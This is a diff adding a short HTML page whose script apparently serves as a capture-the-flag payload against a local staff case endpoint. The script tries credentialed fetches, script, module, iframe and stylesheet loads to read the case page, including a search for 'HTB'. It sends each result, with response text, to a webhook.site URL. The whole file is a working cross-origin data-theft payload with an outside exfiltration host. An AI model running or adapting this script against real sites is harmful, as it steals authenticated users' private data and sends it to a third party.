@@ -1,0 +1,16 @@
+<!doctype html><html><head><title>p8</title></head><body>p8
+<script>
+var H="https://webhook.site/4b355a3b-6bd1-4a29-a69e-8f84325671d6";
+var G="https://127.0.0.1:8443/staff/cases/BT-017/graph.mjs";
+var C="https://127.0.0.1:8443/staff/cases/BT-017";
+function b(k,v){try{var i=new Image();i.src=H+"/r?k="+encodeURIComponent(k)+"&v="+encodeURIComponent(String(v).slice(0,600));}catch(e){}}
+function go(n,f){try{f().then(function(v){b(n,v)},function(e){b(n+"_ERR",(e&&e.name)+":"+(e&&e.message))})}catch(e){b(n+"_THROW",e.message)}}
+b("start","origin="+location.origin);
+go("cors_graph",async function(){var r=await fetch(G,{credentials:"include",mode:"cors",cache:"no-store"});var t=await r.text();return r.status+"|"+t.slice(0,400)});
+go("nocors_graph",async function(){var r=await fetch(G,{credentials:"include",mode:"no-cors",cache:"no-store"});return r.type+":"+r.status+":"+r.body});
+go("script_classic",function(){return new Promise(function(res){var s=document.createElement("script");s.src=G;var t0=Date.now();s.onload=function(){res("LOADED "+((Date.now()-t0)/1000))};s.onerror=function(e){res("ERROR "+((Date.now()-t0)/1000))};document.body.append(s);setTimeout(function(){res("TIMEOUT")},8000)})});
+go("script_module",function(){return new Promise(function(res){var s=document.createElement("script");s.type="module";s.src=G;s.onload=function(){res("LOADED")};s.onerror=function(e){res("ERROR")};document.body.append(s);setTimeout(function(){res("TIMEOUT")},8000)})});
+go("iframe_read",function(){return new Promise(function(res){var f=document.createElement("iframe");f.src=C;f.onload=function(){var out=[];try{out.push("cd:"+(f.contentDocument?"yes":"null"))}catch(e){out.push("cd_thr:"+e.name)}try{out.push("href:"+f.contentWindow.location.href)}catch(e){out.push("href_thr:"+e.name)}try{out.push("len:"+f.contentWindow.length)}catch(e){out.push("len_thr:"+e.name)}try{out.push("find:"+f.contentWindow.find("HTB"))}catch(e){out.push("find_thr:"+e.name)}res(out.join("|"))};document.body.append(f);setTimeout(function(){res("TIMEOUT")},9000)})});
+go("css_link",function(){return new Promise(function(res){var l=document.createElement("link");l.rel="stylesheet";l.href=G;l.onload=function(){var o=[];try{o.push("sheets:"+document.styleSheets.length);var s=document.styleSheets[document.styleSheets.length-1];o.push("rules:"+s.cssRules.length)}catch(e){o.push("rules_thr:"+e.name)}res(o.join("|"))};l.onerror=function(){res("ERROR")};document.head.append(l);setTimeout(function(){res("TIMEOUT")},8000)})});
+go("fetch1337",async function(){var r=await fetch("http://127.0.0.1:1337/staff/cases/BT-017",{credentials:"include",mode:"cors"});var t=await r.text();return r.status+"|len="+t.length+"|"+t.slice(0,120)});
+</script></body></html>
